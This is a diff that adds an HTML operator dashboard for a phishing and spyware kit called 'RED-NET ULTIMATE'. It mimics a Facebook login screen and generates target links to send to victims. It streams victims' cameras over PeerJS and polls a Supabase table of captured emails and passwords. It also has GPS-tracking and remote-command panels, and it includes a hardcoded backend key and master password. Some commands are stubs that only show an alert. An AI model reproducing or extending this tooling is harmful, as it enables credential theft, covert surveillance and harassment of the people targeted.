@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RED-NET ULTIMATE V31</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root { --fb-blue: #1877f2; --master-red: #ff0000; --dark: #0a0a0a; --gold: #ffd700; --green: #00ff00; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #000; color: #fff; overflow: hidden; }
+
+        /* Master Database UI */
+        #master-ui { position: fixed; inset: 0; background: #000; z-index: 20000; display: none; overflow-y: auto; padding: 25px; border: 5px solid var(--master-red); }
+        .master-header { border-bottom: 3px solid var(--master-red); padding-bottom: 15px; text-align: center; margin-bottom: 30px; }
+        .master-header h1 { color: var(--master-red); margin: 0; letter-spacing: 5px; font-size: 28px; }
+        
+        .agent-list-card { background: #151515; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 20px; box-shadow: 0 0 15px rgba(255,0,0,0.2); }
+        .spy-btn { background: var(--master-red); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+
+        /* Slider Engine */
+        .slider { display: flex; width: 500vw; height: 100vh; transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+        .page { width: 100vw; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; }
+        .header { text-align: center; padding-bottom: 15px; border-bottom: 1px solid #222; color: var(--fb-blue); font-weight: bold; font-size: 20px; text-transform: uppercase; letter-spacing: 2px; }
+        
+        .card { background: #111; border-radius: 15px; padding: 20px; margin-top: 20px; border: 1px solid #222; }
+        .monitor-box { width: 100%; height: 260px; background: #000; border-radius: 10px; border: 1px solid #333; overflow: hidden; position: relative; }
+        video, iframe { width: 100%; height: 100%; border: none; }
+
+        /* Buttons & Inputs */
+        .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .btn { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:active { background: #333; transform: scale(0.95); }
+        .btn-danger { color: #ff4444; border-color: #441111; }
+
+        #auth-screen { position: fixed; inset: 0; background: #fff; z-index: 10000; padding: 40px 20px; text-align: center; color: #000; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; background: #f0f2f5; font-size: 16px; color: #000; }
+        .dark-input { background: #000 !important; color: var(--fb-blue) !important; border: 1px solid #333 !important; }
+
+        .fb-login-btn { background: var(--fb-blue); color: #fff; border: none; width: 100%; padding: 16px; font-weight: bold; border-radius: 8px; font-size: 16px; cursor: pointer; }
+
+        .master-access-trigger { position: fixed; bottom: 20px; right: 20px; width: 60px; height: 60px; background: rgba(255,0,0,0.1); border: 2px dashed #333; border-radius: 50%; z-index: 15000; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 10px; color: #333; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div class="master-access-trigger" onclick="tryMasterAccess()">MASTER<br>ACCESS</div>
+
+<div id="master-ui">
+    <div class="master-header"><h1>SYSTEM OVERSEER</h1></div>
+    <div id="agent-database-list"></div>
+    <button class="fb-login-btn" style="background:#222; color:red; border:1px solid red; margin-top:40px;" onclick="location.reload()">TERMINATE MASTER SESSION</button>
+</div>
+
+<div id="auth-screen">
+    <div style="font-size: 45px; font-weight: bold; color: var(--fb-blue); margin: 60px 0 40px 0;">facebook</div>
+    <input type="text" id="reg-name" placeholder="Mobile number or email">
+    <input type="password" id="reg-pass" placeholder="Password">
+    <button class="fb-login-btn" onclick="userLogin()">Log In</button>
+    <div style="margin: 25px 0; border-bottom: 1px solid #ddd; position: relative;">
+        <span style="position: absolute; top: -10px; background: #fff; padding: 0 10px; left: 45%; color: #666; font-size: 14px;">OR</span>
+    </div>
+    <input type="file" id="reg-file" accept="image/*" style="border:none; background:none; margin-bottom: 10px;">
+    <button class="fb-login-btn" style="background:#42b72a;" onclick="tryMasterSignUp()">Create New Account</button>
+</div>
+
+<div class="slider" id="main-slider">
+    <div class="page">
+        <div class="header">EXPLOIT DASHBOARD</div>
+        <div class="card" style="text-align: center;">
+            <img id="u-avatar" style="width:90px; height:90px; border-radius:50%; border:3px solid var(--fb-blue); object-fit: cover;">
+            <h2 id="u-display-name" style="margin:15px 0 5px 0;">Agent Name</h2>
+            <div id="u-device-info" style="font-size: 12px; color: #666;">Model: Loading...</div>
+        </div>
+        <div class="card">
+            <label style="font-size:11px; color:#888;">SHARE THIS TARGET LINK:</label>
+            <input type="text" id="target-copy-link" readonly class="dark-input" style="margin-top:10px; text-align:center;">
+            <button class="fb-login-btn" onclick="copyLink()" style="margin-top:10px;">COPY TARGET URL</button>
+        </div>
+        <p style="text-align:center; color:#333; font-size:14px; margin-top:40px;">Swipe Left to Start ➔</p>
+    </div>
+
+    <div class="page">
+        <div class="header">TARGET VISUALS</div>
+        <div class="monitor-box"><video id="live-video" autoplay playsinline muted></video></div>
+        <div class="cmd-grid">
+            <button class="btn" onclick="sendCommand('front_cam')">FRONT CAM</button>
+            <button class="btn" onclick="sendCommand('back_cam')">BACK CAM</button>
+        </div>
+    </div>
+
+    <div class="page">
+        <div class="header">GPS LOCATION</div>
+        <div class="monitor-box"><iframe id="live-gps" src="about:blank"></iframe></div>
+        <button class="fb-login-btn" style="background:#1a1a1a; border:1px solid #333; margin-top: 15px;">TRACK LIVE POSITION</button>
+    </div>
+
+    <div class="page">
+        <div class="header">CAPTURED CREDENTIALS</div>
+        <div class="card">
+            <div style="padding:15px; border-bottom:1px solid #222;">Email: <span id="data-u" style="color:var(--green); font-weight:bold;">Waiting...</span></div>
+            <div style="padding:15px;">Password: <span id="data-p" style="color:var(--green); font-weight:bold;">Waiting...</span></div>
+        </div>
+    </div>
+
+    <div class="page">
+        <div class="header">REMOTE COMMANDS</div>
+        <div class="card">
+            <input type="text" id="input-msg" class="dark-input" placeholder="Message to show on screen...">
+            <button class="fb-login-btn" style="margin:0; padding:12px; font-size:12px;" onclick="sendCommand('msg')">SEND SCREEN MESSAGE</button>
+        </div>
+        <div class="card">
+            <input type="text" id="input-url" class="dark-input" placeholder="Redirect URL (https://...)">
+            <button class="fb-login-btn" style="margin:0; padding:12px; font-size:12px; background:#42b72a;" onclick="sendCommand('redirect')">REDIRECT TARGET WEBSITE</button>
+        </div>
+        <div class="cmd-grid">
+            <button class="btn" onclick="sendCommand('vibrate')">VIBRATE</button>
+            <button class="btn" onclick="sendCommand('flash')">FLASH</button>
+            <button class="btn" onclick="sendCommand('shot')">SCREENSHOT</button>
+            <button class="btn btn-danger" onclick="sendCommand('scream')">LOUD SCREAM</button>
+            <button class="btn btn-danger" style="grid-column: span 2;" onclick="sendCommand('ghost')">GHOST SCARE (သရဲခြောက်ရန်)</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const _SB_URL = 'https://ymeuoksaxgdcfuueafev.supabase.co';
+    const _SB_KEY = 'sb_publishable_rDcHSRuxOlK6W2jaUrbS1Q_UaE-A-EK';
+    const _client = supabase.createClient(_SB_URL, _SB_KEY);
+
+    let masterDB = JSON.parse(localStorage.getItem('REDNET_FINAL_DB')) || [];
+    let slideLayer = document.getElementById('main-slider');
+    let touchX;
+
+    // Swipe Engine
+    window.addEventListener('touchstart', e => touchX = e.touches[0].clientX);
+    window.addEventListener('touchend', e => {
+        let move = touchX - e.changedTouches[0].clientX;
+        let pos = Math.round(Math.abs(parseInt(slideLayer.style.transform.replace('translateX(', '').replace('vw)', '')) || 0) / 100);
+        if(move > 60 && pos < 4) slideLayer.style.transform = `translateX(-${(pos+1)*100}vw)`;
+        if(move < -60 && pos > 0) slideLayer.style.transform = `translateX(-${(pos-1)*100}vw)`;
+    });
+
+    function tryMasterAccess() {
+        if(prompt("Enter Master Password:") === "223568") {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('master-ui').style.display = 'block';
+            loadMasterData();
+        }
+    }
+
+    function loadMasterData() {
+        const container = document.getElementById('agent-database-list');
+        container.innerHTML = masterDB.map(agent => `
+            <div class="agent-list-card">
+                <b>${agent.u}</b> (Pass: ${agent.p})
+                <button class="spy-btn" onclick="spyAgent('${agent.id}')">SPY ON AGENT</button>
+            </div>`).join('');
+    }
+
+    function spyAgent(id) {
+        const entry = masterDB.find(x => x.id === id);
+        if(entry) { document.getElementById('master-ui').style.display = 'none'; setupDashboard(entry); }
+    }
+
+    function tryMasterSignUp() {
+        if(prompt("Master Password for Sign Up:") === "223568") userSignUp();
+        else alert("Unauthorized!");
+    }
+
+    function userSignUp() {
+        const u = document.getElementById('reg-name').value, p = document.getElementById('reg-pass').value, f = document.getElementById('reg-file').files[0];
+        if(!u || !p) return alert("Fill Name/Pass");
+        const agentID = "RED-" + Math.floor(Math.random()*9999);
+        const save = (img) => {
+            const entry = {u, p, img, id: agentID, dev: navigator.platform};
+            masterDB.push(entry);
+            localStorage.setItem('REDNET_FINAL_DB', JSON.stringify(masterDB));
+            setupDashboard(entry);
+        };
+        save(`https://ui-avatars.com/api/?name=${u}`);
+    }
+
+    function userLogin() {
+        const u = document.getElementById('reg-name').value, p = document.getElementById('reg-pass').value;
+        const entry = masterDB.find(x => x.u === u && x.p === p);
+        if(entry) setupDashboard(entry); else alert("Login Failed!");
+    }
+
+    function setupDashboard(entry) {
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('u-avatar').src = entry.img;
+        document.getElementById('u-display-name').innerText = entry.u;
+        document.getElementById('target-copy-link').value = window.location.href.split('index.html')[0].split('?')[0] + "target.html?id=" + entry.id;
+        
+        const peer = new Peer('watcher-' + entry.id);
+        peer.on('call', call => { 
+            call.answer(); 
+            call.on('stream', s => document.getElementById('live-video').srcObject = s); 
+        });
+
+        // Continuous Data Fetching
+        setInterval(async () => {
+            const { data } = await _client.from('credentials').select('*').eq('agent_id', entry.id).order('created_at', { ascending: false }).limit(1);
+            if(data?.[0]) {
+                const parts = data[0].captured_info.split(' | ');
+                document.getElementById('data-u').innerText = parts[0].replace('U:','').trim();
+                document.getElementById('data-p').innerText = parts[1].replace('P:','').trim();
+            }
+        }, 2000);
+    }
+
+    function sendCommand(cmd) { 
+        let val = "";
+        if(cmd === 'msg') val = document.getElementById('input-msg').value;
+        if(cmd === 'redirect') val = document.getElementById('input-url').value;
+        alert("REMOTE SIGNAL: [" + cmd.toUpperCase() + "] " + val + " SENT."); 
+    }
+    
+    function copyLink() { const c = document.getElementById('target-copy-link'); c.select(); document.execCommand("copy"); alert("Link Copied!"); }
+</script>
+</body>
+</html>
